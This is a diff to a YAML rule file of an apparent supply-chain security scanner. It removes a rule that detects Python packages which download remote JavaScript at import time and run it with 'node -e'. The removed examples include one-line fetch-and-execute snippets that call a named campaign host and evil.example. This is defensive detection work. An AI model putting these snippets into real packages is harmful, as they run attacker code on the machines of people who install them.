@@ -618,37 +618,6 @@ examples:
     - "const dir = path.join('claude', 'settings.json'); // not the hidden dir"
     - "path.join('.claude', 'hookspad') // typo, not the hooks/ path"
 ---
-id: PY_IMPORTTIME_REMOTE_JS_001
-name: "PyPI import-time remote JavaScript execution"
-description: "Detects a Python package that, at install or import time (setup.py / __init__.py), downloads remote JavaScript and runs it through Node. This is the TrapDoor-style PyPI payload: an import-time fetch of attacker-hosted .js executed via node -e. Requires all three signals (remote retrieval + Node execution + a JavaScript payload reference) so packages that merely mention Node or JavaScript do not trip it."
-severity: CRITICAL
-category: supply-chain
-targets: ["setup.py", "__init__.py"]
-match_mode: all
-remediation: "Remove the remote fetch and Node execution from package import/setup code. Packages must never download and run remote code at install or import time. Audit the host for credential exposure and rotate any tokens reachable from the build or import environment."
-patterns:
-  # (1) Remote retrieval bound to a JavaScript payload: a fetch call
-  # whose argument is a .js URL (optionally with query/fragment) or the
-  # campaign host. Binding the .js to the fetch call in one pattern
-  # means an unrelated `.js` string elsewhere in the file (package_data,
-  # a fetched config.json) does not satisfy this signal.
-  - type: regex
-    value: "(?i)(requests\\.get|httpx\\.get|urllib\\.request\\.urlopen|urllib\\.request\\.urlretrieve|aiohttp\\.[a-z_]+|\\burlopen|\\burlretrieve)\\s*\\([^)]*(\\.js[\"'?#)]|ddjidd564\\.github\\.io|defi-security-best-practices)"
-  # (2) Node EVAL of a payload (node -e / --eval, shell or argv form).
-  # The eval form is required so a local `node build.js` does not count.
-  - type: regex
-    value: "(?i)(node\\s+(-e|--eval)\\b|[\"']node[\"']\\s*,\\s*[\"'](-e|--eval)[\"'])"
-examples:
-  true_positive:
-    - "import urllib.request, subprocess; js = urllib.request.urlopen('https://ddjidd564.github.io/defi-security-best-practices/x.js').read().decode(); subprocess.run(['node', '-e', js])"
-    - "import requests, os; payload = requests.get('https://evil.example/risk-profiler.js').text; os.system('node -e ' + payload)"
-    - "import requests, subprocess; js = requests.get('https://evil.example/p.js?v=2').text; subprocess.run(['node', '--eval', js])"
-  false_positive:
-    - "cfg = requests.get('https://example.com/config.json').json()  # config only, no execution"
-    - "subprocess.run(['node', 'scripts/build.js'])  # local build, no remote fetch"
-    - "js = requests.get('https://cdn.example/foo.js').text; subprocess.run(['node', 'scripts/build.js'])  # fetched asset, but node runs a local file, not -e the payload"
-    - "# Optional: pipe results.js through node -e after you download it yourself"
----
 id: RS_BUILD_WALLET_EXFIL_001
 name: "Rust build.rs wallet/keystore exfiltration"
 description: "Detects a Cargo build script (build.rs) that reads crypto wallet or keystore material (Sui / Move / Solana / Aptos keystores, mnemonics) and sends it over the network. This is the TrapDoor-style crates.io payload: build-time theft of signing keys. Chain-based: requires BOTH a keystore reference AND a network exfil sink in the build script, so a build.rs that merely compiles native code or a normal app that reads a wallet without any network does not trip it."
